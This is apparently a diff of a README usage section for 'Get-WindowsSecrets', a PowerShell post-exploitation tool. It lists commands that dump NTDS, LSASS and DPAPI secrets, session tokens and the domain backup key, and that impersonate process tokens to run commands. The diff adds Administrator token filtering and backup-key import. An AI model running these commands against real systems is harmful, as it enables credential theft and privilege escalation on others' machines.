@@ -50,18 +50,17 @@ Get-WindowsSecrets -VNC
 Get-WindowsSecrets -NTDS
 Get-WindowsSecrets -NTDS -ExportDomainBackupKey
 Get-WindowsSecrets -SessionTokens
+Get-WindowsSecrets -SessionTokens -FilterUser "Administrator"
 Get-WindowsSecrets -ActivatePrivilege "SeShutdownPrivilege"
 Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "ImpersonateLoggedOnUser"
 Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessWithToken"
 Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser"
 Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser" -Command "whoami"
 Get-WindowsSecrets -LSASS
-Get-WindowsSecrets -DPAPI
-Get-WindowsSecrets -DPAPI -InUserContext
-Get-WindowsSecrets -DPAPI -InUserContext -NoMasterKeysDecryption
+Get-WindowsSecrets -DPAPI [-SkipLSASS] [-SkipNTDS]
+Get-WindowsSecrets -DPAPI -ImportDomainBackupKey <HexStringDomainBackupKeyPVKFormat> -SkipNTDS
+Get-WindowsSecrets -DPAPI -InUserContext [-NoMasterKeysDecryption]
 Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2'
-Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS
-Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS -SkipNTDS
 ```
 
 Creds and NTHashes parameters helped for DPAPI only (If you compromised these secrets for a user).
